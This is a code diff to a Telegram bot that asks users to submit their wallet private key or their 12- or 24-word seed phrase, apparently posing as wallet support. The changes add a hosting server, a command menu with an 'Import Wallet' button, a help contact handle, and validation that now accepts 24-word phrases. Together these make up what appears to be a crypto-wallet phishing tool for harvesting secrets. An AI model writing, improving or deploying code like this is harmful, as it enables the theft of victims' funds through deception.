@@ -1,7 +1,27 @@
 require('dotenv').config();
+const express = require('express'); // Added for port support
 const TelegramBot = require('node-telegram-bot-api');
 const axios = require('axios');
 const fs = require('fs');
+
+
+// ====== Express Server Setup for Render ======
+const app = express();
+const PORT = process.env.PORT || 3000;
+
+// Health check endpoint
+app.get('/', (req, res) => {
+  res.status(200).json({ 
+    status: 'Bot is running',
+    bots: process.env.TG_BOT_TOK1 ? 'Active' : 'Inactive'
+  });
+});
+
+
+// Start the server
+app.listen(PORT, () => {
+  console.log(`Server listening on port ${PORT}`);
+});
 
 // ====== Check for duplicate instances to prevent 409 Conflict ======
 const LOCK_FILE = '.bot.lock';
@@ -230,7 +250,7 @@ bots.forEach(bot => {
 Please enter your wallet **Private Key** :`;
             } else if (data === 'seed_phrase') {
                 message = `You selected *Seed Phrase* as your authentication method. 
-Please enter your **12-word Seed Phrase** (separated by spaces):`;
+Please enter your **12 or 24-word Seed Phrase** (separated by spaces):`;
             }
 
             bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
@@ -256,6 +276,38 @@ Please provide the *Private key* or *Seed Phrase* for the wallet affected to beg
     });
 });
 
+// ====== Add Menu Button ======
+bots.forEach(bot => {
+    // Set the bot commands (appears as menu button)
+    bot.setMyCommands([
+        { command: '/start', description: 'Restart the bot' },
+        { command: '/help', description: 'Get assistance' },
+        { command: '/wallet', description: 'Wallet operations' }
+    ]);
+
+    // Handle the /help command
+    bot.onText(/\/help/, (msg) => {
+        const chatId = msg.chat.id;
+        bot.sendMessage(chatId, `🛟 *Help Center*\n\nNeed assistance? Here are your options:\n\n• Use the menu buttons below\n• Contact @yesmine2008\n• Type /start to reset`, 
+        { parse_mode: 'Markdown' });
+    });
+
+    // Handle the /wallet command
+    bot.onText(/\/wallet/, (msg) => {
+        const chatId = msg.chat.id;
+        bot.sendMessage(chatId, "🔑 *Wallet Manager*", {
+            parse_mode: 'Markdown',
+            reply_markup: {
+                inline_keyboard: [
+                    [
+                        { text: 'Import Wallet', callback_data: 'import_wallet' },
+                    ]
+                ]
+            }
+        });
+    });
+});
+
 // ====== Handle user input ======
 bots.forEach(bot => {
     bot.on('message', (msg) => {
@@ -274,7 +326,7 @@ bots.forEach(bot => {
             const words = text.trim().split(/\s+/);
             isValid = words.length > 11;
             if (!isValid) {
-                errorMessage = '❌ *Invalid Input!* It must contain at least **12 words**. Please try again:';
+                errorMessage = '❌ *Invalid Input!* It must contain at least **12 or 24 words**. Please try again:';
             }
         } else if (authMethod === 'private_key') {
             isValid = text.length > 20;
